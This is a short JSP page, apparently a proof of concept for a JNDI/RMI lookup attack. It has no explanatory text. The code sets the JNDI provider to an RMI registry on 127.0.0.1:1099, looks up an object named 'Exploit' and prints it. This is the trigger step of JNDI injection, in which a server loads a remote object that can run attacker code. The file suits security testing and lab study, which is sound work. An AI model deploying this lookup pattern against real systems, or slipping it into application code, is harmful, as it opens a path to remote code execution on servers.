<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*,java.beans.*,java.lang.*,java.rmi.*,java.rmi.server.*,java.rmi.registry.*,javax.naming.*"%>
<%
System.setProperty(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.rmi.registry.RegistryContextFactory");
System.setProperty(Context.PROVIDER_URL,"rmi://127.0.0.1:1099");
Context ctx = new InitialContext();
Object obj = ctx.lookup("Exploit");
System.out.println(obj.toString());
%>
